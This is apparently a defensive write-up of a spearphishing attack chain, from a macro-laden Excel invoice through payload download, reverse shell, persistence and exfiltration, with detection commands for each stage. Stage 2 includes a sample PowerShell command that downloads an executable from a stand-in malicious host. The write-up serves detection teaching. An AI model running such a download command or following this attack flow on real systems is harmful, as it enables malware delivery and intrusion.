Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a backdoor on the victim's machine.

Attack Flow Breakdown:

**Stage 1: Initial Access via Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important Update" and an attachment named "Invoice_2023.xlsx".
- **Key Artifacts**: Email headers, attachment file.
- **Detection Focus**: Monitor for emails with suspicious attachments or unusual subject lines.

```shell
# Example of a suspicious email log entry
grep "Important Update" /var/log/mail.log
```

**Stage 2: Opening the Malicious Attachment**
- **Applications Involved**: Outlook, Excel
- **User Action**: The user opens the attachment in Excel, which contains a macro designed to download and execute a payload.
- **Key Artifacts**: Excel file with macros, macro execution logs.
- **Detection Focus**: Monitor for Excel files with macros that are executed, especially those that download external content.

```shell
# Example of a command that might be executed by the macro
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-url.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\payload.exe'"
```

**Stage 3: Macro Execution and Payload Download**
- **Applications Involved**: Excel, PowerShell
- **User Action**: The macro executes, triggering a PowerShell command that downloads a malicious executable from a remote server.
- **Key Artifacts**: PowerShell command logs, downloaded executable file.
- **Detection Focus**: Monitor for PowerShell commands that download files from the internet, especially from known malicious domains.

```shell
# Example of monitoring PowerShell logs for suspicious downloads
Get-WinEvent -LogName "Windows PowerShell" | Where-Object { $_.Message -like "*Invoke-WebRequest*" }
```

**Stage 4: Execution of the Malicious Payload**
- **Applications Involved**: PowerShell, Windows Explorer
- **User Action**: The downloaded executable is executed, establishing a reverse shell connection to the attacker's command and control (C2) server.
- **Key Artifacts**: Executable file, network connection logs.
- **Detection Focus**: Monitor for unusual outbound connections, especially those initiated by newly created executables.

```shell
# Example of a command to check for outbound connections
netstat -ano | findstr "ESTABLISHED"
```

**Stage 5: Establishing Persistence**
- **Applications Involved**: Windows Task Scheduler
- **User Action**: The payload creates a scheduled task to ensure it runs on system startup.
- **Key Artifacts**: Scheduled task entries, task creation logs.
- **Detection Focus**: Monitor for the creation of scheduled tasks that execute unusual executables.

```shell
# Example of checking for newly created scheduled tasks
schtasks /query /fo LIST /v | findstr "TaskName"
```

**Stage 6: Data Exfiltration**
- **Applications Involved**: PowerShell, Web Browser
- **User Action**: The attacker uses the established connection to exfiltrate sensitive data from the victim's machine.
- **Key Artifacts**: Network traffic logs, data files being sent to the C2 server.
- **Detection Focus**: Monitor for large outbound data transfers, especially to known malicious IP addresses.

```shell
# Example of monitoring network traffic for large data transfers
tcpdump -i eth0 -n 'tcp and (dst port 80 or dst port 443)' -c 1000
```
